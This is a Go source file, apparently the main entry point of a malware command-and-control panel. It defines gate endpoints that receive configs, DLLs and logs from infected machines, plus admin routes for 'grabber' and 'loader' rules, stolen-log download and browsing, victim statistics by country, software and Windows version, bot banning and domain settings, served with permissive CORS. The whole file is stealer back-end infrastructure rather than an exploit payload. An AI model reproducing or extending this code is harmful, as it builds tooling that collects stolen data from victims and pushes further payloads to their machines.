package main

import (
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"strings"

	panelconfig "./config"
	backup "./handlers/backup"
	ban "./handlers/ban"
	config "./handlers/config"
	dash "./handlers/dash"
	domaind "./handlers/domaind"
	gate "./handlers/gate"
	grabber "./handlers/grabber"
	loader "./handlers/loader"
	login "./handlers/login"
	logs "./handlers/logs"
	users "./handlers/users"
	lggr "./logger"

	"github.com/gin-gonic/gin"
)

var logger = lggr.Log()

func LiberalCORS(ctx *gin.Context) {
	ctx.Header("Access-Control-Allow-Origin", "*")
	if ctx.Request.Method == "OPTIONS" {
		if len(ctx.Request.Header["Access-Control-Request-Headers"]) > 0 {
			ctx.Header("Access-Control-Allow-Headers", ctx.Request.Header["Access-Control-Request-Headers"][0])
		}
		ctx.AbortWithStatus(http.StatusOK)
	}
}

func PatchFront(str string) {
	b, err := ioutil.ReadFile("./dist/js/app.js")
	if err != nil {
		logger.Println("main.PatchFront: read app.js error: ", err)
		os.Exit(-1)
	}
	fileData := string(b)
	outputApp := strings.Replace(fileData, "REPLACE_ME_PLS", "/"+str, 1)
	err = os.Remove("./dist/js/app.js")
	if err != nil {
		logger.Println("main.PatchFront: remove old app.js error: ", err)
		os.Exit(-1)
	}

	err = ioutil.WriteFile("./dist/js/app.js", []byte(outputApp), 664)
	if err != nil {
		logger.Println("main.PatchFront: write patchted app.js error: ", err)
		os.Exit(-1)
	}
}

var DEBUG_BUILD = true

func main() {
	var router *gin.Engine
	if DEBUG_BUILD {
		router = gin.Default()
	} else {
		gin.SetMode(gin.ReleaseMode)
		router = gin.New()
	}

	routName := panelconfig.GetConfig().RoutName
	PatchFront(routName)

	router.Static("/"+routName+"/", "./dist/")

	router.Use(LiberalCORS)

	router.POST("/cfg/", gate.CfgHandler)
	router.POST("/dlls/", gate.DllsHandler)
	router.POST("/log/", gate.LogHandler)
	router.POST("/loader/complete/", loader.Complete)

	rout := router.Group(routName)
	{
		rout.POST("/login/", login.Login)

		dashGroup := rout.Group("/dash/")
		{
			dashGroup.POST("/daysData/", dash.GetDaysData)
			dashGroup.POST("/logsInfo/", dash.GetLogsInfo)
			dashGroup.POST("/mapData/", dash.GetMapData)
			dashGroup.POST("/topCountriesData/", dash.GetTopCountriesData)
			dashGroup.POST("/countriesData/", dash.GetCountriesData)
			dashGroup.POST("/softData/", dash.GetSoftData)
			dashGroup.POST("/topPrefixData/", dash.GetTopPrefixData)
			dashGroup.POST("/prefixData/", dash.GetPrefixData)
			dashGroup.POST("/winData/", dash.GetWinData)
		}

		logsGroup := rout.Group("/logs/")
		{
			logsGroup.POST("/data/", logs.GetLogsData)
			logsGroup.POST("/download/", logs.DownloadLog)
			logsGroup.POST("/delete/", logs.LogDelete)
			logsGroup.POST("/comment/", logs.LogComment)
			logsGroup.POST("/filter/", logs.FilterLogs)
			logsGroup.POST("/selected/", logs.SelectedAction)
			logsGroup.POST("/logTree/", logs.GetLogTree)
			logsGroup.POST("/fileData/", logs.GetFileData)
		}

		grabberGroup := rout.Group("/grabber/")
		{
			grabberGroup.POST("/rules/", grabber.GetRules)
			grabberGroup.POST("/create/", grabber.Create)
			grabberGroup.POST("/edit/", grabber.Edit)
			grabberGroup.POST("/delete/", grabber.Delete)
			grabberGroup.POST("/run/", grabber.Run)
		}

		loaderGroup := rout.Group("/loader/")
		{
			loaderGroup.POST("/rules/", loader.GetRules)
			loaderGroup.POST("/create/", loader.Create)
			loaderGroup.POST("/edit/", loader.Edit)
			loaderGroup.POST("/delete/", loader.Delete)
			loaderGroup.POST("/run/", loader.Run)
		}

		configGroup := rout.Group("/config/")
		{
			configGroup.POST("/get/", config.Get)
			configGroup.POST("/update/", config.Update)
		}

		settingsGroup := rout.Group("/settings/")
		{
			usersGroup := settingsGroup.Group("/users/")
			{
				usersGroup.POST("/get/", users.GetUsersData)
				usersGroup.POST("/create/", users.Create)
				usersGroup.POST("/edit/", users.Edit)
				usersGroup.POST("/delete/", users.Delete)
			}
			backupsGroup := settingsGroup.Group("/backups/")
			{
				backupsGroup.POST("/get/", backup.GetBackupsData)
				backupsGroup.POST("/create/", backup.Create)
				backupsGroup.POST("/delete/", backup.Delete)
				backupsGroup.POST("/download/", backup.Download)
			}
			ddGroup := settingsGroup.Group("/dd/")
			{
				ddGroup.POST("/get/", domaind.GetDdData)
				ddGroup.POST("/create/", domaind.Create)
				ddGroup.POST("/edit/", domaind.Edit)
				ddGroup.POST("/delete/", domaind.Delete)
			}
			bannedGroup := settingsGroup.Group("/banned/")
			{
				bannedGroup.POST("/get/", ban.GetBannedData)
				bannedGroup.POST("/create/", ban.Create)
				bannedGroup.POST("/edit/", ban.Edit)
				bannedGroup.POST("/delete/", ban.Delete)
			}
		}
	}

	err := router.Run(":80")
	if err != nil {
		log.Fatal("Starting panel error: ", err)
	}
}
